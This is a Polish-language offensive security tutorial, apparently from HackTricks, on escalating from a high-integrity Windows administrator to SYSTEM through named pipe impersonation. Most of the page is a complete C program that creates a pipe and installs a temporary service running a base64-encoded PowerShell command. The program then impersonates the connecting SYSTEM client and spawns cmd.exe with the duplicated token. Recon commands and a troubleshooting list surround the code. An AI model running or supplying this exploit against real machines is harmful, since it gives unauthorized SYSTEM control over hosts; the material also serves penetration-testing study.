# Z wysokiej integralności do SYSTEM za pomocą Name Pipes

{{#include ../../banners/hacktricks-training.md}}

Jest to wariant impersonacji za pomocą named pipe dla **administratora/SCM**: proces z podniesionymi uprawnieniami tworzy tymczasową usługę, której proces potomny łączy się jako `SYSTEM`, a następnie dokonuje impersonacji tego klienta. Jeśli kontekst początkowy nie może tworzyć usług, ale ma `SeImpersonatePrivilege`, użyj wymuszenia połączenia przez uprzywilejowaną usługę; zobacz [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) oraz [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md). Tworzenie usługi wymaga dostępu do SCM oraz uprawnienia `SERVICE_START` do nowej usługi, natomiast `CreateProcessWithTokenW` wymaga `SeImpersonatePrivilege`.<sup>[[2]](#references)[[3]](#references)</sup>

Szybko potwierdź oczekiwany kontekst początkowy:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Przebieg kodu:**

1. Utwórz serwer named pipe **przed** uruchomieniem usługi. Podczas oczekiwania traktuj zwrócenie przez `ConnectNamedPipe` wartości `FALSE` wraz z `ERROR_PIPE_CONNECTED` jako sukces: oznacza to, że klient wygrał wyścig i połączył się między `CreateNamedPipe` a `ConnectNamedPipe`.<sup>[[4]](#references)</sup>
2. Utwórz i uruchom usługę, która połączy się z utworzonym pipe'em i coś zapisze. Kod usługi wykona ten zakodowany kod PS: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Po połączeniu się usługi i wykonaniu przez nią zapisu wywołaj `ImpersonateNamedPipeClient`, otwórz token wynikowego wątku i zduplikuj go jako token podstawowy.<sup>[[1]](#references)</sup>
4. Użyj tego tokena podstawowego do uruchomienia `cmd.exe`.<sup>[[2]](#references)</sup>

Ta metoda zakłada, że wywołujący może utworzyć/uruchomić usługę i posiada uprawnienia wymagane przez `CreateProcessWithTokenW` (zwykle `SeImpersonatePrivilege`). Jest to technika high-integrity-to-SYSTEM, a nie prymityw dostępny dla dowolnego użytkownika o niskich uprawnieniach.<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> Jeśli utworzenie/uruchomienie usługi się nie powiedzie, przykład nie zasygnalizuje tego wątkowi pipe'a i może czekać w nieskończoność. Przed użyciem poza laboratorium dodaj obsługę błędów oraz timeout overlapped pipe'a. Użyj także losowej nazwy pipe'a/usługi, aby uniknąć kolizji.

`ImpersonateNamedPipeClient` przyjmuje kontekst powiązany z **ostatnią odczytaną wiadomością**, dlatego samo połączenie jest niewystarczające: spraw, aby uprzywilejowany klient wykonał zapis, zweryfikuj, że `ReadFile` zwróciło dane, i dopiero wtedy rozpocznij impersonation. Zduplikuj token impersonation wątku do tokena `TokenPrimary` z `SecurityImpersonation`; token podstawowy jest wymagany przez API tworzenia procesów.<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### Diagnostyka błędów

- `ConnectNamedPipe == FALSE` z `ERROR_PIPE_CONNECTED`: kontynuuj; pipe jest już połączony.<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` kończy się błędem `ERROR_CANNOT_IMPERSONATE` (`1368`): potwierdź, że klient SYSTEM faktycznie zapisał dane, a `ReadFile` zostało ukończone. Sprawdź również żądany przez klienta poziom impersonacji; klienci na poziomie identification/anonymous nie mogą być w pełni impersonowani.<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` kończy się błędem `ERROR_PRIVILEGE_NOT_HELD` (`1314`): pierwotny caller nie posiada `SeImpersonatePrivilege`. Z kontekstu administratora o wysokiej integralności użyj ścieżki kopiowania tokenu opisanej w [SeImpersonate from High To System](seimpersonate-from-high-to-system.md) albo użyj `CreateProcessAsUserW` podczas impersonacji SYSTEM, jeśli wymagane uprawnienia są dostępne.<sup>[[2]](#references)</sup>
- `CreateServiceA` zwraca `ERROR_SERVICE_EXISTS` (`1073`): usuń nieaktualny wpis `PiperSrv` albo zmień losowo `PIPESRV`; zawsze usuwaj tymczasową usługę po triggerze.<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
